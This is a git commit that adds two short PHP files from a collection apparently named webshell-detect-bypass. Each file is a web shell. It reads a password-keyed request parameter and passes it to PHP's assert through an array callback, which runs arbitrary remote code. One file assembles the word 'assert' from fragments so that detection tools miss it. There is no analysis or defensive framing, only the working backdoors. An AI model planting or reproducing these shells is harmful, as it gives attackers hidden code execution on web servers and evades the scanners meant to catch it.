32be5d26bf05b518107af8fcb36544c916de5e36
Levi Li <admin@hackfun.org>
2018-12-20 11:34:55 +0800

    Add files via upload
    From:https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/php
    Author:Build by LandGrey

---
+++ php/array_intersect_ukey.php
@@ -0,0 +1,9 @@
+<?php
+/**
+ * Noticed: (PHP 5 >= 5.4.0, PHP 7)
+ *
+ */
+$password = "LandGrey";
+$ch = explode(".","hello.ass.world.er.t");
+array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);
+?>
---
+++ php/array_udiff_assoc.php
@@ -0,0 +1,8 @@
+<?php
+/**
+* Noticed: (PHP 5 >= 5.4.0, PHP 7)
+*
+*/
+$password = "LandGrey";
+array_udiff_assoc(array($_REQUEST[$password]), array(1), "assert");
+?>
